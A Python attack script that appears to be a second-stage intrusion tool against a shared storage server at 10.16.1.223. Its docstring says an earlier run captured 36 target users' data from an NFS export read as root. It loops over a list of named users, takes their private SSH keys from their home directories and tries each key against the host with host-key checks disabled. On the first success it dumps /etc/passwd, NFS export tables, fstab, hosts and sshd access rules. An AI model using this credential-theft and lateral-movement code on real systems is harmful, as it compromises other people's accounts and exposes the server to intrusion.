#!/usr/bin/env python3
"""i10830 run 2 - emit the never-written SYSTEM block of store03 (10.16.1.223).

Run 1 captured all 36 target users from the mounted /public4 export as root.
This second bounded run only executes the SYSTEM block over one authenticated
SSH session: /etc/exports, /etc/fstab, /etc/passwd, sshd_config, /proc/mounts,
/var/lib/nfs/etab, exportfs -v, /etc/hosts.  Read-only.
"""
import os, sys, base64, subprocess, tempfile, shutil, time

HOME_ROOT = os.environ.get("I10830_HOME", "/public4/home")
HOST = "10.16.1.223"
OUT_CAP = int(os.environ.get("I10830_CAP", "1200000"))

CANDIDATES = [
    ("yanzy", ["cluster", "id_rsa"]),
    ("yinyue2", ["id_rsa"]),
    ("yuchenyang", ["id_rsa"]),
    ("zhanggj", ["id_rsa"]),
    ("zhangshao", ["id_rsa"]),
    ("zhangsongge", ["id_ed25519"]),
    ("zhangxiangkai", ["id_ed25519", "id_rsa"]),
    ("zhangyd", ["id_rsa"]),
    ("zhangyf9", ["id_rsa"]),
    ("zhaole", ["id_rsa"]),
    ("zhaopenglu", ["id_ed25519"]),
    ("zhaoxy6", ["cluster", "id_rsa"]),
    ("zhaoyx3", ["id_rsa"]),
    ("zhaozg", ["id_ed25519", "id_rsa"]),
    ("zhenggf", ["id_rsa"]),
    ("zhengzhi", ["id_ed25519", "id_rsa"]),
    ("zhipu_test", ["id_rsa"]),
    ("zhongshiqi", ["id_rsa"]),
    ("zhup", ["id_ed25519", "id_rsa"]),
    ("zhuwenbo", ["id_ed25519", "id_rsa"]),
    ("zhuww", ["id_rsa"]),
    ("zz_sugon_yytest", ["id_ed25519"]),
    ("zz_test_1", ["id_ed25519"]),
    ("zz_test_jiahe", ["id_ed25519"]),
    ("zz_test_user1", ["id_ed25519"]),
    ("zz_test_user4", ["id_ed25519"]),
    ("chenwch", ["id_rsa"]),
    ("tanbo", ["id_rsa"]),
    ("hewl", ["id_rsa"]),
]

used = [0]


def emit(s=""):
    s = str(s)
    if used[0] >= OUT_CAP:
        return False
    room = OUT_CAP - used[0] - 1
    if len(s) > room:
        s = s[:room]
    sys.stdout.write(s + "\n")
    sys.stdout.flush()
    used[0] += len(s) + 1
    return True


SYSTEM = r"""
echo "###I10830S"
echo "ID=$(id 2>/dev/null)"
echo "UNAME=$(uname -a 2>/dev/null)"
echo "HOSTNAME=$(hostname 2>/dev/null)"
echo "EXPORTS=$(base64 -w0 /etc/exports 2>/dev/null | head -c 30000)"
echo "FSTAB=$(base64 -w0 /etc/fstab 2>/dev/null | head -c 20000)"
echo "MOUNTS=$(grep -Ei 'nfs|public|/export|store|parastor' /proc/mounts 2>/dev/null | head -60 | tr '\n' '|')"
echo "PASSWD=$(base64 -w0 /etc/passwd 2>/dev/null | head -c 40000)"
echo "NFSETAB=$(ls -l /var/lib/nfs/etab 2>&1 | head -2 | tr '\n' '|'); $(base64 -w0 /var/lib/nfs/etab 2>/dev/null | head -c 30000)"
echo "EXPORTFS=$(exportfs -v 2>&1 | head -40 | tr '\n' '|')"
echo "SSHDCONF=$(grep -Ei 'AllowUsers|AllowGroups|DenyUsers|DenyGroups|Match |PubkeyAuth|AuthorizedKeys|PasswordAuth|PermitRootLogin|ListenAddress|Subsystem|ForceCommand' /etc/ssh/sshd_config 2>&1 | head -60 | tr '\n' '|')"
echo "HOSTS=$(base64 -w0 /etc/hosts 2>/dev/null | head -c 30000)"
echo "LSROOT=$(ls -la /public /public2 /public4 /public5 /public6 2>&1 | head -60 | tr '\n' '|')"
echo "###I10830SE"
"""


def ssh_argv(keypath, user, remote):
    return ["ssh", "-F", "/dev/null", "-i", keypath,
            "-o", "BatchMode=yes", "-o", "ConnectTimeout=8",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "GlobalKnownHostsFile=/dev/null", "-o", "PasswordAuthentication=no",
            "-o", "KbdInteractiveAuthentication=no", "-o", "NumberOfPasswordPrompts=0",
            "-o", "PreferredAuthentications=publickey", "-o", "IdentitiesOnly=yes",
            "-o", "IdentityAgent=none", "-o", "LogLevel=ERROR",
            "%s@%s" % (user, HOST), remote]


def run_ssh(keypath, user, script, timeout=70):
    tmp = tempfile.mkdtemp(prefix="i10830b.")
    dst = os.path.join(tmp, "k")
    try:
        shutil.copyfile(keypath, dst)
        os.chmod(dst, 0o600)
        r = subprocess.run(ssh_argv(dst, user, "bash -s"), input=script.encode(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)
        return r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace"), r.returncode
    except Exception as e:
        return "", "EXC %s" % str(e)[:200], -1
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def main():
    t0 = time.time()
    emit("###I10830B2BEGIN")
    emit("PODID=%s" % os.environ.get("I10830_PODID", ""))
    sys_done = False
    for u, keys in CANDIDATES:
        last = None
        for kf in keys:
            kp = os.path.join(HOME_ROOT, u, ".ssh", kf)
            if not os.path.isfile(kp):
                continue
            out, err, rc = run_ssh(kp, u, SYSTEM)
            first = ((err or "").strip().splitlines() or [""])[0][:200]
            if "###I10830S" in out:
                emit("SYSSSH %s key=%s -> OK rc=%s" % (u, kf, rc))
                emit("SYSTEM user=%s key=%s" % (u, kf))
                emit(out[:400000])
                emit("SYSTEMEND %s" % u)
                sys_done = True
                break
            if "This account is currently not available" in (out + err):
                emit("SYSSSH %s key=%s -> NOLOGIN rc=%s :: %s" % (u, kf, rc, first))
                break
            emit("SYSSSH %s key=%s -> FAIL rc=%s :: %s" % (u, kf, rc, first))
            last = (u, kf)
        if sys_done:
            break
    emit("### SUMMARY system=%s" % sys_done)
    emit("### DONE elapsed=%.1fs bytes=%d" % (time.time() - t0, used[0]))
    emit("###I10830B2END")


if __name__ == "__main__":
    main()
